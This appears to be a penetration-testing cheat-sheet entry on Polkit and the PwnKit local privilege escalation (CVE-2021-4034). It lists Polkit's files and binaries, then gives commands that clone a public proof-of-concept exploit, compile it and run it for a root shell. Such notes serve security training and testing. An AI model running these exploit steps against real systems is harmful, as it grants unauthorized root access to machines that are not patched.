## Polkit / PwnKit (CVE-2021-4034)

Polkit is a Linux authorization service that mediates communication between user-space software and system components. It controls which actions unprivileged users can perform on behalf of the system.

It operates through two sets of files:

| Type | Path |
| ---- | ---- |
| Actions / policies | `/usr/share/polkit-1/actions` |
| Rules | `/usr/share/polkit-1/rules.d` |

Custom rules can be placed in `/etc/polkit-1/localauthority/50-local.d/` with a `.pkla` extension.

### Key binaries

| Binary | Purpose |
| ------ | ------- |
| `pkexec` | Run a program as another user or as root |
| `pkaction` | List available actions |
| `pkcheck` | Verify if a process is authorized for a given action |

```shell
pkexec -u root id
```

---

### CVE-2021-4034 — PwnKit

[PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) is a memory corruption vulnerability in `pkexec` that has existed in every version of Polkit since its initial commit in 2009. It allows any unprivileged local user to gain a full root shell.

### Exploit

```shell
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```

After execution, upgrade the shell and verify:

```shell
bash
id
```

> 💡 PwnKit affects virtually every major Linux distribution — Debian, Ubuntu, Fedora, CentOS, and others. If Polkit is present and unpatched, this is one of the most reliable local escalation paths available regardless of kernel version.
